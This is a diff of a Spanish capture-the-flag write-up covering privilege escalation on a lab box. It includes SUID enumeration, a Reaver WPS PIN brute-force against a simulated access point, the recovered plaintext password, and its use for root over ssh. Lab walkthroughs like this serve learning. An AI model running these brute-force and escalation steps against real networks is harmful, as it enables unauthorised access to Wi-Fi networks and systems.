@@ -120,10 +120,12 @@ De esta manera ya tendremos una terminal totalmente interactiva además de que p
 
 ## Escalada de privilegios
 
-Como he realizado otras veces compruebo las diferentes formas de escalar privilegios
+Como he realizado otras veces compruebo las diferentes formas de escalar privilegios.
+
+Compruebo si puedo exzplotar algun binario abusando del SUID y que el propietario sea root 
 
 ```shell
-find / -perm -4000 2>/dev/null
+find / -perm -4000 -user root 2>/dev/null | xargs ls -l
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/snapd/snap-confine
@@ -152,7 +154,34 @@ getcap -r / 2>/dev/null
 /usr/bin/reaver = cap_net_raw+ep
 ```
 
-nos encontramos una capability interesante 
+nos encontramos una capability interesante `reaver`
+
+## ¿Qué es Reaver?
+Reaver realiza un ataque de fuerza bruta contra el número PIN de Wi-Fi Protected Setup de un punto de acceso. Una vez encontrado el PIN WPS, se puede recuperar el WPA PSK y, alternativamente, se pueden reconfigurar los ajustes inalámbricos del AP. Este paquete también proporciona el ejecutable Wash, una utilidad para identificar puntos de acceso habilitados para WPS.
+
+## Obtenemos la contraseña 
+Comprobamos que esta instalado:
+```shell
+which reaver
+/usr/bin/reaver
+```
+
+Vemos como si hacemos `ifconfig` para ver las interfaces os encontramos con una `mon0`en modo monitor justamente para usar con esta herramienta.
+
+Si ejecutamos el siguiente comando
+```shell
+iw dev
+```
+
+Nos encontramos un esquema de como esta montado la red además de ver una interfaz `wlan0` que simula un punto de acceso. 
+Por otor lado vemos una interfaz`wlan1` que parece ser un cliente y se encuentra conectado a esta punto de acceso.
+
+Viendo como se utiliza esta herramienta vemos que necesitamos la MAC del punto de eacceso.por lo tnato :
+
+```shell
+reaver -i mon0 -b 02:00:00:00:00:00 -vv
+```
+Vemos que lanza el pin `12345670` y es correcto de forma que nos devuelve la contraseña en texto claro `WhatIsRealAnDWhAtIsNot51121!`
 
 ```shell
 [+] WPS PIN: '12345670'
@@ -162,5 +191,4 @@ nos encontramos una capability interesante
 
 ```
 
-
-Finalmente con esta contraseña obtenenmos acceso a root
+Finalmente con esta contraseña obtenemos acceso a root usando esa contraseña para conectarnos con `ssh`
